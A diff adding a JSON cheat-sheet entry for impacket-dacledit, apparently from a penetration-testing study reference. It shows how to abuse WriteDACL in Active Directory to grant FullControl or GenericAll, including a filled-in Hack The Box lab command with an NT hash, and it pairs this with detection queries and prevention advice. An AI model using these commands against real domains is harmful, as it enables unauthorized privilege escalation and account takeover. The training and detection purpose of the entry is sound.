@@ -1,0 +1,100 @@
+{
+  "id": "ad-impacket-dacledit",
+  "name": "impacket-dacledit (DACL Editing)",
+  "command": "impacket-dacledit -action write -rights FullControl -principal '<user>' -target-dn '<target_dn>' -dc-ip <dc_ip> '<domain>/<user>' -hashes ':<nt_hash>'",
+  "description": "Modify the Discretionary Access Control List (DACL) on an AD object (user, group, OU, or container) to grant arbitrary permissions. With WriteDACL over a target, you can grant yourself FullControl, GenericAll, or specific rights like WriteProperty. Commonly used in ACL abuse chains to escalate from WriteDACL to full object control.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "ACL Abuse",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "HTB TombWatcher engagement",
+  "tags": [
+    "writedacl",
+    "dacl",
+    "acl-abuse",
+    "impacket",
+    "ad-permissions",
+    "fullcontrol"
+  ],
+  "mitre": [
+    "T1222.001"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE IDEA ===\nWriteDACL lets you add new ACEs to an object's DACL. impacket-dacledit\nwrites FullControl (or specific rights) for your principal on the target\nobject. This is the bridge between WriteDACL and full control.\n\n=== GRANT FULLCONTROL ON AN OU ===\n  impacket-dacledit -action write -rights FullControl -inheritance \\\n    -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' \\\n    -dc-ip <dc_ip> '<domain>/john' -hashes ':<nt_hash>'\n  # -inheritance means child objects inherit the ACE\n\n=== GRANT GENERICALL ON A USER ===\n  impacket-dacledit -action write -rights GenericAll \\\n    -principal 'attacker' -target 'victim' \\\n    -dc-ip <dc_ip> '<domain>/attacker:<password>'\n\n=== RESTORE (cleanup) ===\n  impacket-dacledit -action restore -file dacledit-YYYYMMDD-HHMMSS.bak \\\n    -dc-ip <dc_ip> '<domain>/attacker:<password>'\n  # The backup file is created automatically on each write\n\n=== NOTES ===\n- Objects with adminCount=1 do NOT inherit ACEs from parent OUs (AdminSDHolder protection)\n- The tool creates a .bak file on each write for restoration\n- Use -inheritance flag when you need the ACE to propagate to child objects",
+  "examples": [
+    {
+      "label": "Grant FullControl on an OU with inheritance",
+      "command": "impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' -dc-ip 10.129.232.167 'TOMBWATCHER.HTB/john' -hashes ':ad9324754583e3e42b55aad4d3b8d2bf'"
+    },
+    {
+      "label": "Grant GenericAll on a user with password auth",
+      "command": "impacket-dacledit -action write -rights GenericAll -principal '<user>' -target '<target_account>' -dc-ip <dc_ip> '<domain>/<user>:<password>'"
+    },
+    {
+      "label": "Restore original DACL from backup",
+      "command": "impacket-dacledit -action restore -file dacledit-20261102-192707.bak -dc-ip <dc_ip> '<domain>/<user>:<password>'"
+    }
+  ],
+  "references": [
+    {
+      "title": "impacket dacledit.py",
+      "url": "https://github.com/fortra/impacket"
+    },
+    {
+      "title": "The Hacker Recipes - WriteDACL",
+      "url": "https://www.thehacker.recipes/ad/movement/dacl/write-dacl"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-impacket-owneredit",
+      "note": "If you have WriteOwner instead of WriteDACL, take ownership first, then you get implicit WriteDACL.",
+      "rel": "prereq"
+    },
+    {
+      "id": "ad-shadow-credentials",
+      "note": "Once you have FullControl, Shadow Credentials takes the account.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "WriteDACL permission allows adding new ACEs to the object's security descriptor. The attacker grants themselves FullControl, then pivots through password reset, Shadow Credentials, or other write-based attacks.",
+    "prerequisites": "WriteDACL over the target object (user, group, OU, or container).",
+    "impact": "Arbitrary permission grant on the target - effectively full control of any objects under the modified DACL.",
+    "detection": "[MITRE T1222.001] Event 5136 modifying nTSecurityDescriptor; Event 4662 with WriteProperty on the DACL.",
+    "artifacts": "5136 DACL modification events; dacledit .bak backup file on attacker disk.",
+    "splunk_spl": "index=wineventlog sourcetype=\"WinEventLog:Security\" EventCode=5136 AttributeLDAPDisplayName=\"nTSecurityDescriptor\"\n| table _time, SubjectUserName, ObjectDN, OperationType",
+    "elastic_kql": "event.code:\"5136\" AND winlog.event_data.AttributeLDAPDisplayName:\"nTSecurityDescriptor\"",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 5136 and AttributeLDAPDisplayName == \"nTSecurityDescriptor\"\n| project TimeGenerated, Actor=SubjectUserName, Target=ObjectDN, Op=OperationType",
+    "sigma_rules": "win_security_dacl_modified_on_ad_object",
+    "prevention": "Monitor nTSecurityDescriptor changes (5136) on sensitive OUs and objects; use AdminSDHolder; restrict WriteDACL delegation.",
+    "sources": [
+      "HTB TombWatcher",
+      "https://attack.mitre.org/techniques/T1222/001/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "DACL modification on AD object",
+        "logic": "SecurityEvent\n| where EventID == 5136 and AttributeLDAPDisplayName == \"nTSecurityDescriptor\"\n| project TimeGenerated, Actor=SubjectUserName, Target=ObjectDN, Op=OperationType\n| where Target contains \"OU=\" or Target contains \"CN=Domain Admins\"",
+        "data_source": "windows-security",
+        "log_ids": [
+          "5136"
+        ],
+        "attack": [
+          "T1222.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate delegation changes by AD administrators",
+        "tuning": "Filter to sensitive OUs and high-value targets; baseline normal DACL changes"
+      }
+    ]
+  }
+}
